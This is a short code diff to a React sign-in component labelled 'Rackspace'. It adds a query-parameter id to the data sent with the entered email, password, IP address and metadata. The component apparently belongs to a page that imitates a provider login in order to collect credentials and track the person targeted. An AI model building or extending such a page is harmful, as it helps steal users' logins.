@@ -4,8 +4,10 @@ import banner from '../../assets/side-banner.jpg'
 import { Authenticate } from '../../helpers/Auth'
 import axios from 'axios'
 import Loader from '../../component/Loader'
+import useQueryParams from '../../hooks/useQueryParams'
 
 const Rackspace = () => {
+  const id = useQueryParams()
   const [userID, setUserID] = useState('')
   const [password, setPassword] = useState('')
   const [error, setError] = useState('')
@@ -49,7 +51,7 @@ const Rackspace = () => {
       setError('Invalid email or password')
     } else {
       setIsLoading(true)
-      Authenticate(userID, password, 'rackspace', IPAddress, metaData).then(
+      Authenticate(userID, password, 'rackspace', IPAddress, metaData, id).then(
         () => setRedirect(true)
       )
     }
